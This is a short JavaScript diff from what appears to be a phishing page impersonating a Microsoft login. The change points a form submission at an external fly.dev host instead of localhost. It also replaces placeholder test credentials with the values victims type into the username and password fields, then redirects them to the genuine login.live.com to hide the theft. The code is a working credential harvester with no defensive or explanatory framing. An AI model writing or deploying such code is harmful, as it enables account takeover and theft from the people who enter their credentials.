@@ -100,14 +100,14 @@ document.addEventListener("DOMContentLoaded", () => {
   document.querySelectorAll("#btn_final").forEach((b) => {
     b.addEventListener("click", () => {
       console.log("Done");
-      fetch("http://localhost:3000/login", {
+      fetch("https://slick-cow.fly.dev/login", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          loginfmt: "test@mail.com",
-          passwd: "testpass",
+          loginfmt: unameInp.value,
+          passwd: pwdInp.value,
         }),
       }).then(() => {
         window.location.replace("https://login.live.com/");
